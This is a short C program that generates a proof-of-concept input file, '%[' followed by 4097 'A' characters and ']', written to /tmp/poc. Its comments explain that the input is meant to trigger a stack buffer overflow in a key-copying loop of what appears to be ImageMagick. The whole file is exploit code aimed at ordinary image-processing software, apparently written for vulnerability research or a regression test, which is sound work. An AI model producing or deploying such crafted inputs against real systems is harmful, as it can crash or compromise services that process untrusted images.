#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    // The vulnerability is at line 6317: key[i] = (*p++);
    // The loop writes into key[] without checking if i < MaxTextExtent
    // when the ']' is not found. We need to write MaxTextExtent+1 bytes
    // before the closing bracket to overflow the stack buffer.
    // MaxTextExtent = 4096 (from Magick++/Include.h)
    
    fputc('%', f);
    fputc('[', f);
    for (int i = 0; i < 4097; i++) {
        fputc('A', f);
    }
    fputc(']', f);
    fclose(f);
    return 0;
}